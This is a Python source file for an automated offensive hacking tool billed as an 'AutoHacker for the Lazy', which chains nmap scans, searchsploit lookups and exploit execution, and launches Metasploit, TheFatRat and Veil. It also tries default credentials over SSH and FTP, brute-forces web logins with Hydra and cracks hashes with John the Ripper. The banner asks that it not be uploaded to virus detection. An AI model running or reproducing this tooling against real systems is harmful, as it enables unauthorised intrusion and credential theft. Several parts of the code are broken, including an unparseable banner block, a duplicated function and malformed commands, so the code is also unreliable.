'''
  ____                _           _   _               _____ _     _____ 
 / ___|_ __ ___  __ _| |_ ___  __| | | |__  _   _ _  |___  | |__ |___ / 
| |   | '__/ _ \/ _` | __/ _ \/ _` | | '_ \| | | (_)    / /| '_ \  |_ \ 
| |___| | |  __/ (_| | ||  __/ (_| | | |_) | |_| |_    / / | | | |___) |
 \____|_|  \___|\__,_|\__\___|\__,_| |_.__/ \__, (_)  /_/  |_| |_|____/ 
                                            |___/                       
 _____      ___  _ _  _           _____       _  __             _  _   
|___  | __ / _ \(_) || |  _ __   |___ / _ __ / |/ /_  _ __ ___ | || |  
   / / '__| | | | | || |_| '_ \    |_ \| '_ \| | '_ \| '_ ` _ \| || |_ 
  / /| |  | |_| | |__   _| | | |  ___) | | | | | (_) | | | | | |__   _|
 /_/ |_|   \___// |  |_| |_| |_| |____/|_| |_|_|\___/|_| |_| |_|  |_|  
              |__/                                                     
'''
import os
import subprocess
import paramiko
from ftplib import FTP
import getpass
import random
import time


[--]   AutoHacker for the Lazy ; }             [--]")
[--]  Dont upload to any virus detection       [--]")
[--]            Version: 2.0.4                 [--]")
[--]          Codename: 3n!gm@                 [--]")
[--]   Follow me on Github: @ you wont find me [--]")
[--]   Kali/Parrot Linux : @NoName             [--]")
[--]                                           [--]")
[--]     SELECT AN OPTION TO BEGIN:            [--]")
[--] ._________________________________________[--]")



def generate_card_grid_with_text():
    # Define the symbols for the cards

    print (" _____ _     _____   _____      ___  _ _  _ ")
    print ("|___  | |__ |___ /  |___  | __ / _ \(_) || |  _ __  ")
    print ("   / /| '_ \  |_ \     / / '__| | | | | || |_| '_ \ ")
    print ("  / / | | | |___) |   / /| |  | |_| | |__   _| | | |")
    print (" /_/  |_| |_|____/   /_/ |_|   \___// |  |_| |_| |_|")
    print ("                                  |__/  ")
    print (" _____       _  __             _  _   ")
    print ("|___ / _ __ (_)/ /_  _ __ ___ | || |  ")
    print ("  |_ \| '_ \| | '_ \| '_ ` _ \| || |_ ")
    print (" ___) | | | | | (_) | | | | | |__   _|")
    print ("|____/|_| |_|_|\___/|_| |_| |_|  |_|  ")
    print ("     _ _____ _   _ ___ ___  _   _ ____  ")
    print ("    | |___ /| \ | |_ _/ _ \| | | / ___| ")
    print (" _  | | |_ \|  \| || | | | | | | \___ \ ")
    print ("| |_| |___) | |\  || | |_| | |_| |___) |")
    print (" \___/|____/|_| \_|___\___/ \___/|____/ ")

    print ("\n")
    # Print the custom text
    print("\nMade by:")
    print("7r0j@n3n!gm@")
    print("Jenious")

    card_symbols = ['♥', '♦', '♣', '♠']

    # Define the size of the grid
    size = 4

    # Generate the card grid pattern
    card_grid = []
    for _ in range(size):
        # Shuffle the symbols for each row
        shuffled_symbols = random.sample(card_symbols, len(card_symbols))
        line = " ".join(shuffled_symbols)
        card_grid.append(line)

    # Print the card grid
    for line in card_grid:
        print(line)      

print ("\n")

# List of common usernames
usernames = ['anonymous', 'administrator', 'root', '', 'admin', 'Admin', 'Root', 'User', 'user', ' ', 'Administrator', 'Anonymous']

def run_command(command):
    """Run a command and capture its output."""
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Error running command {command}: {e}\nStderr: {e.stderr}"
    except FileNotFoundError:
        return f"Command not found: {command[0]}"
    except Exception as e:
        return f"An unexpected error occurred: {e}"

def run_nmap_scan(ip, additional_flags=""):
    """Run an Nmap scan with optional additional flags."""
    base_command = ['nmap', '-sC', '-sS', '-sV', '-T4']
    if additional_flags:
        command = base_command + additional_flags.split() + [ip]
    else:
        command = base_command + [ip]
    
    try:
        output = run_command(command)
        print("Nmap scan result:")
        print(output)
        
        if "open" in output:
            open_lines = [line for line in output.splitlines() if 'open' in line]
            print("\nFiltered lines containing 'open':")
            for line in open_lines:
                print(line)
        else:
            print("\nNo open ports found.")
            return None
        
        return output
        
    except Exception as e:
        print(f"An error occurred while running nmap: {e}")

def run_gobuster(ip, wordlist_path):
    """Run Gobuster enumeration commands and print results."""
    results = []

    # Gobuster directory scan
    print("\nRunning Gobuster directory scan...")
    gobuster_command = ['gobuster', 'dir', '-u', f'http://{ip}', '-w', wordlist_path]
    gobuster_output = run_command(gobuster_command)
    results.append("Gobuster Directory Scan:\n")
    results.append(gobuster_output)
    
    # Gobuster directory scan with extensions
    print("\nRunning Gobuster directory scan with extensions...")
    extensions = 'php,txt,html,css'
    gobuster_ext_command = ['gobuster', 'dir', '-u', f'http://{ip}', '-w', wordlist_path, '-x', extensions]
    gobuster_ext_output = run_command(gobuster_ext_command)
    results.append("Gobuster Directory Scan with Extensions:\n")
    results.append(gobuster_ext_output)
    
    # Gobuster virtual host scan
    print("\nRunning Gobuster virtual host scan...")
    vhost_wordlist = '/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt'
    gobuster_vhost_command = ['gobuster', 'vhost', '-u', f'http://{ip}', '-w', vhost_wordlist, '--append-domain']
    gobuster_vhost_output = run_command(gobuster_vhost_command)
    results.append("Gobuster Virtual Host Scan:\n")
    results.append(gobuster_vhost_output)
    
    return "\n".join(results)









def search_exploits(version):
    command = ['searchsploit', version]
    try:
        output = run_command(command)
        
        if output.strip():
            print(f"\nExploits for version '{version}':")
            print(output)
            return output
        else:
            print(f"\nNo exploits found for version '{version}'.")
            return None
            
    except Exception as e:
        print(f"An error occurred while running searchsploit: {e}")

def execute_exploit(exploit_path):
    print(f"Executing exploit at {exploit_path}...")
    try:
        if exploit_path.endswith('.pl'):
            subprocess.run(['perl', exploit_path])
        elif exploit_path.endswith('.py'):
            subprocess.run(['python', "/usr/share/exploitdb/exploits/", exploit_path])
        elif exploit_path.endswith('.rb'):
            subprocess.run(['ruby', exploit_path])
        elif exploit_path.endswith('.sh'):
            subprocess.run(['bash', exploit_path])
        elif exploit_path.endswith('.c'):
            print("Compiling C exploit is required.")
        else:
            print("Unsupported exploit type.")
    except Exception as e:
        print(f"An error occurred while executing the exploit: {e}")

def use_msfconsole():
    print("Launching msfconsole...")
    try:
        subprocess.run(['msfconsole'])
    except FileNotFoundError:
        print("msfconsole is not installed or not found in your PATH.")
    except Exception as e:
        print(f"An unexpected error occurred while launching msfconsole: {e}")

def use_msfvenom():
    print("Launching msfvenom...")
    try:
        subprocess.run(['msfvenom'])
    except FileNotFoundError:
        print("msfvenom is not installed or not found in your PATH.")
    except Exception as e:
        print(f"An unexpected error occurred while launching msfvenom: {e}")

def clear_screen():
    """Clears the terminal screen based on the operating system."""
    os.system('cls' if os.name == 'nt' else 'clear')
    generate_card_grid_with_text()

def open_terminal_command(command):
    """Open a new terminal window and execute the given command."""
    try:
        # Replace gnome-terminal with your terminal emulator if different
        subprocess.run(f'gnome-terminal -- bash -c "{command}; exec bash"', shell=True, check=True)
        print(f"Terminal: Opened a new terminal window with command '{command}'")
    except subprocess.CalledProcessError as e:
        print(f"Terminal: Failed to open terminal window: {e}")
    except Exception as e:
        print(f"Terminal: An unexpected error occurred while opening terminal: {e}")

def open_telnet_session(ip_address):
    """Open a new terminal window for Telnet session."""
    command = f'telnet {ip_address}'
    open_terminal_command(command)

def open_ssh_session(ip_address, username):
    """Open a new terminal window for SSH session."""
    command = f'ssh {username}@{ip_address}'
    open_terminal_command(command)

def open_ftp_session(ip_address):
    """Open a new terminal window for FTP session."""
    command = f'ftp {ip_address}'
    open_terminal_command(command)

def try_common_credentials(ip_address):
    """Try common credentials for SSH, FTP, and Telnet."""
    for username in usernames:
        print(f"Trying SSH with username: '{username}' and empty password...")
        if connect_ssh(ip_address, username, ''):
            open_ssh_session(ip_address, username)
            return True
        
    for username in usernames:
        print(f"Trying FTP with username: '{username}' and empty password...")
        if connect_ftp(ip_address, username, ''):
            open_ftp_session(ip_address)
            return True

    print("Trying Telnet...")
    open_telnet_session(ip_address)
    return False

def open_redis_session(ip_address):
    """Open a Redis CLI session with the specified IP address and port."""
    try:
        port = input("Enter the Redis port (default is 6379): ").strip()
        port = port if port else '6379'
        command = f'redis-cli -h {ip_address} -p {port}'
        open_terminal_command(command)
    except Exception as e:
        print(f"An error occurred while opening Redis session: {e}")



def connect_ssh(ip_address, username, password):
    """Attempt to connect to an SSH server."""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip_address, username=username, password=password)
        print(f"SSH: Successfully connected to {ip_address} with username '{username}' and password '{password}'")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"SSH: Authentication failed for username '{username}' with password '{password}'")
        return False
    except paramiko.SSHException as e:
        print(f"SSH: SSHException occurred: {e}")
        return False
    except Exception as e:
        print(f"SSH: An unexpected error occurred: {e}")
        return False

def connect_ftp(ip_address, username, password):
    """Attempt to connect to an FTP server."""
    try:
        ftp = FTP(ip_address)
        ftp.login(user=username, passwd=password)
        print(f"FTP: Successfully connected to {ip_address} with username '{username}' and password '{password}'")
        ftp.quit()
        return True
    except Exception as e:
        print(f"FTP: Failed to connect: {e}")
        return False


def run_smbclient(ip):
    """Run smbclient command."""
    # Prompt user for additional options or entire command
    custom_command = input("Do you want to specify a custom smbclient command? (y/n): ").strip().lower()
    
    if custom_command == 'y':
        # Allow the user to input the entire smbclient command
        command_input = input("Enter the smbclient command (e.g., '-L //10.129.50.30 /WorkShares'): ").strip()
        # Construct the full smbclient command
        command = f'smbclient {command_input}'
        # Open the smbclient command in a new terminal window
        open_terminal_command(command)
    else:
        command = ['smbclient', '-L', f'//{ip}']
        # Run the smbclient command
        print("Running smbclient command...")
        output = run_command(command)
        print("SMB Client Output:")
        print(output)

def open_terminal_command(command):
    """Open a new terminal window and execute the given command."""
    try:
        # Replace 'gnome-terminal' with your terminal emulator if different
        subprocess.run(f'gnome-terminal -- bash -c "{command}; exec bash"', shell=True, check=True)
        print(f"Terminal: Opened a new terminal window with command '{command}'")
    except subprocess.CalledProcessError as e:
        print(f"Terminal: Failed to open terminal window: {e}")
    except Exception as e:
        print(f"Terminal: An unexpected error occurred while opening terminal: {e}")





def ask_for_additional_flags():
    """Prompt the user to specify additional flags for the nmap scan."""
    additional_flags = input("\nEnter additional Nmap flags (e.g., '-p-', '--script vuln'): ").strip()
    return additional_flags


def open_rdp_session(ip_address):
    """Open an RDP session with the specified IP address and optional parameters."""
    try:
        params = input("Enter additional parameters for xfreerdp (e.g., '/u:Administrator /p:password'): ").strip()
        command = f'xfreerdp /v:{ip_address}{3389}{params}'
        open_terminal_command(command)
    except Exception as e:
        print(f"An error occurred while opening RDP session: {e}")


def open_thefatrat():
    """Open TheFatRat application."""
    try:
        command = 'fatrat'
        open_terminal_command(command)
    except Exception as e:
        print(f"An error occurred while opening TheFatRat: {e}")


def open_veil():
    """Open the Veil application."""
    try:
        command = 'veil'
        open_terminal_command(command)
    except Exception as e:
        print(f"An error occurred while opening Veil: {e}")



def append_to_hosts(ip):
    """Append an IP address to the /etc/hosts file using a new terminal."""
    try:
        # Construct the command to be executed in a new terminal
        terminal_command = ""
        # Run the command
        run_command(terminal_command, shell=True)
        print(f"Command to append IP address '{ip}' to /etc/hosts has been executed.")
    except Exception as e:
        print(f"An error occurred while appending to /etc/hosts: {e}")







def open_mysql_session(ip_address):
    """Open a MySQL CLI session with the specified IP address and optional parameters."""
    try:
        port = '3306'  # Default MySQL port
        username = input("Enter the MySQL username (default is 'root'): ").strip()
        username = username if username else 'root'
        password = input("Enter the MySQL password: ").strip()
        
        # Construct the MySQL command
        command = f'mysql -h {ip_address} -P {port} -u {username} -p{password}'
        open_terminal_command(command)
    except Exception as e:
        print(f"An error occurred while opening MySQL session: {e}")






def run_hydra(target_ip):
    """Run Hydra with user-specified parameters."""
    user_list = input("Enter the path to the user list: ").strip()
    password_list = input("Enter the path to the password list: ").strip()
    
    # Default values for the form URL and HTTP POST form
    login_url = "/login.php"
    post_form = "username=^USER^&password=^PASS^:F=incorrect"
    
    change_defaults = input("Would you like to change the default login URL and HTTP POST form parameters? (y/n): ").strip().lower()
    if change_defaults == 'y':
        login_url = input("Enter the login URL (e.g., /login.php): ").strip()
        post_form = input("Enter the HTTP POST form parameters (e.g., username=^USER^&password=^PASS^:F=incorrect): ").strip()
    
    # Construct the Hydra command
    command = [
        'hydra',
        '-L', user_list,
        '-P', password_list,
        target_ip,
        'http-post-form',
        f"{login_url}:{post_form}"
    ]
    
    # Run the Hydra command
    print("\nRunning Hydra with the following command:")
    print(" ".join(command))
    
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Error running Hydra: {e}\nStderr: {e.stderr}")
    except FileNotFoundError:
        print("Hydra is not installed or not found in your PATH.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

def run_john_the_ripper():
    """Run John the Ripper with user-specified parameters."""
    # Get user input for the wordlist and hash file
    wordlist_path = input("Enter the path to the wordlist file: ").strip()
    hash_file = input("Enter the path to the hash file: ").strip()
    
    # Default to wordlist mode
    mode = "wordlist"
    
    # Ask if the user wants to change the mode
    change_mode = input("Would you like to change the default mode? (y/n): ").strip().lower()
    if change_mode == 'y':
        mode = input("Enter the John the Ripper mode (e.g., 'wordlist', 'incremental', 'crack'): ").strip()
    
    # Construct the John the Ripper command based on the mode
    if mode == "wordlist":
        command = [
            'john',
            '--wordlist=' + wordlist_path,
            hash_file
        ]
    elif mode == "incremental" or mode == "crack":
        command = [
            'john',
            hash_file
        ]
    else:
        print(f"Unknown mode '{mode}', using default 'wordlist' mode.")
        command = [
            'john',
            '--wordlist=' + wordlist_path,
            hash_file
        ]
    
    # Run the John the Ripper command
    print("\nRunning John the Ripper with the following command:")
    print(" ".join(command))
    
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Error running John the Ripper: {e}\nStderr: {e.stderr}")
    except FileNotFoundError:
        print("John the Ripper is not installed or not found in your PATH.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

    # Display cracked passwords
    print("\nDisplaying cracked passwords:")
    try:
        show_command = ['john', '--show', hash_file]
        show_result = subprocess.run(show_command, capture_output=True, text=True, check=True)
        print(show_result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"Error displaying cracked passwords: {e}\nStderr: {e.stderr}")
    except Exception as e:
        print(f"An unexpected error occurred while displaying cracked passwords: {e}")





import subprocess

def run_commands_300(file_path='commands.txt'):
    """Combined function to prompt user for input, find commands, display them, and execute the chosen one."""
    try:
        # Load commands from the file
        with open(file_path, 'r') as f:
            commands = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("Error: The file was not found.")
        return

    # Prompt user to enter a search query
    query = input("Enter the command keyword to search for: ")
    
    # Search for matching commands
    matching_commands = [cmd for cmd in commands if query in cmd]
    
    # Display matching commands and ask user to select one
    if not matching_commands:
        print("No matching commands found.")
        return
    
    print("Matching commands:")
    for index, command in enumerate(matching_commands, start=1):
        print(f"{index}. {command}")
    
    while True:
        try:
            choice = int(input("Choose the number of the command to run (0 to cancel): "))
            if choice == 0:
                print("Operation cancelled.")
                return
            elif 1 <= choice <= len(matching_commands):
                selected_command = matching_commands[choice - 1]
                break
            else:
                print("Invalid choice, please try again.")
        except ValueError:
            print("Invalid input, please enter a number.")
    
    # Execute the selected command
    try:
        result = subprocess.run(selected_command, shell=True, check=True, capture_output=True, text=True)
        print(f"Output:\n{result.stdout}")
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e.stderr}")













def main():
    generate_card_grid_with_text()
    while True:
        user_input = input("Enter the IP address to scan \n '300' for 300 commands \n'clear' to clear screen \n 'open' to open a terminal \n 'add' to append IP to /etc/hosts \n 'x' to exit:\n").strip()

        if user_input.lower() == 'x':
            print("Exiting...")
            break
        elif user_input.lower() == 'clear':
            clear_screen()
            continue
        elif user_input.lower() == '300':
            terminal_command = run_commands_300()
            continue
        elif user_input.lower() == 'open':
            terminal_command = input("Enter the command to run in the new terminal (e.g., 'htop' or 'bash'): ").strip()
            open_terminal_command(terminal_command)
            continue
        elif user_input.lower() == 'add':
            ip_to_add = input("Enter the IP address to append to /etc/hosts:\n").strip()
            append_to_hosts(ip_to_add)
            continue
        
        ip = user_input
        scan_output = run_nmap_scan(ip)
        
        if scan_output is None:
            additional_scan = input("\nNo open ports found. Would you like to specify additional Nmap flags? (y/n): ").strip().lower()
            if additional_scan == 'y':
                additional_flags = ask_for_additional_flags()
                scan_output = run_nmap_scan(ip, additional_flags)
                
                if scan_output is None:
                    print("No results found after applying additional flags.")
                    continue

        if scan_output is None:
            print("No results found. Exiting...")
            continue

        version = input("\nEnter the software version to search for exploits or 'x' to exit:\n").strip()
        if version.lower() == 'x':
            print("Exiting...")
            break

        exploit_output = search_exploits(version)
        if exploit_output is None:
            continue

        while True:
            choice = input("\nSelect an option:\n1: Use exploit\n2: Launch msfconsole\n3: Launch msfvenom\n4: Gobuster enumeration\n5: Run SMB client\n6: Try common credentials\n7: Open Redis CLI\n8: Open RDP Session\n9: Open TheFatRat\n10: Open Veil\n11: Open MySQL CLI\n12: Run Hydra\nr: Run John the Ripper\nx: Cancel\n").strip().lower()
            if choice == '1':
                exploits = [line.split('|')[1].strip() for line in exploit_output.splitlines() if '|' in line and line.split('|')[1].strip()]
                if exploits:
                    print("\nAvailable exploits:")
                    for i, exploit in enumerate(exploits, start=1):
                        print(f"{i}. {exploit}")
                    try:
                        exploit_choice = int(input("\nSelect an exploit number to use or 0 to cancel: ").strip())
                        if 1 <= exploit_choice <= len(exploits):
                            selected_exploit = exploits[exploit_choice - 1]
                            print(f"Using exploit: {selected_exploit}")
                            execute_exploit(selected_exploit)
                        elif exploit_choice == 0:
                            print("Cancelled.")
                        else:
                            print("Invalid choice.")
                    except ValueError:
                        print("Please enter a valid number.")
                else:
                    print("No exploits available.")
            elif choice == '2':
                use_msfconsole()
            elif choice == '3':
                use_msfvenom()
            elif choice == '4':
                wordlist_path = input("Enter the path to the wordlist file for Gobuster: ").strip()
                if not os.path.isfile(wordlist_path):
                    print(f"Wordlist file not found at path: {wordlist_path}. Exiting...")
                    continue
                print("Running Gobuster enumeration...")
                gobuster_results = run_gobuster(ip, wordlist_path)
                print("Displaying Gobuster results:")
                print(gobuster_results)
            elif choice == '5':
                run_smbclient(ip)
            elif choice == '6':
                if not try_common_credentials(ip):
                    print("Failed to connect using common credentials.")
            elif choice == '7':
                open_redis_session(ip)
            elif choice == '8':
                open_rdp_session(ip)
            elif choice == '9':
                open_thefatrat()
            elif choice == '10':
                open_veil()
            elif choice == '11':
                open_mysql_session(ip)
            elif choice == '12':
                run_hydra(ip)
            elif choice == 'r':
                run_john_the_ripper()
            elif choice == 'x':
                print("Exiting...")
                break
            else:
                print("Please enter '1', '2', '3', '4', '5', '6', '7', '8', '9', '10', '11', '12', 'r', or 'x'.")
if __name__ == '__main__':
    main()
